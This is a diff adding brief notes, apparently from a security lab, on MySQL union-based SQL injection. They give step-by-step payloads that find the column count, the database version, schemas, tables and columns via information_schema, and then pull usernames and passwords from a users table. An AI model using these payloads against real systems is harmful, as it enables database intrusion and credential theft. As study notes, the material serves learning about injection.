@@ -1,0 +1,28 @@
+
+Needed info for union based injection:
+- table name
+- column names
+---> select column1, column2 from table_name
+
+1. find out how many columns in original query
+- I can't use union if I don't know that
+->  kimmo sauren' union select null, null, null#
+
+2. find out the version of mysql database
+->  kimmo' union select null, @@version, null#
+
+3. find out table name from information_schema
+- table_name, column_name and information_schema are know globals in MySql database
+First find out databases:
+->  kimmo sauren' union select null, table_schema, null from information_schema.tables#
+Select database and find out tables in that database:
+->  kimmo sauren' union select null, table_name, null from information_schema.tables where table_schema='attack'#
+
+4. find out column names from information schema
+->  kimmo sauren' union select null, column_name, null from information_schema.columns where table_name='users'#
+
+5. Get the information
+-> kimmo sauren' union select null, username, password from users#
+
+
+
